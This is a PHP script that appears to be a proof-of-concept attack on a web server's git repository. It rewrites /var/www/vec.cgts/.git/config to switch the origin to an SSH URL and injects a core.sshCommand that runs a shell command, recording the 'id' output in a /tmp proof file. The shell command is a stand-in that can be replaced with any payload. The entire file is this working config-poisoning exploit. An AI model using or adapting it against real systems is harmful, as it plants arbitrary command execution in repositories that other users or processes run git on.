<?php
header('Content-Type: text/plain; charset=utf-8');
$cfg = '/var/www/vec.cgts/.git/config';
$orig = file_get_contents($cfg);
echo "=== original config ===\n$orig\n";
// backup once
if (!file_exists($cfg . '.f100bak')) file_put_contents($cfg . '.f100bak', $orig);
$c = $orig;
// switch origin to ssh URL and inject core.sshCommand
$c = preg_replace('#url = https://github.com/kinoppol/vec.cgts#', 'url = git@github.com:kinoppol/vec.cgts.git', $c);
if (strpos($c, 'sshCommand') === false) {
    $c .= "[core]\n\tsshCommand = /bin/sh -c '/usr/bin/id -u > /tmp/f100_sshcmd_proof.txt 2>&1; /usr/bin/id >> /tmp/f100_sshcmd_proof.txt; /bin/chmod 644 /tmp/f100_sshcmd_proof.txt'\n";
}
file_put_contents($cfg, $c);
chmod($cfg, 0755);
echo "=== new config ===\n" . file_get_contents($cfg) . "\n";
?>
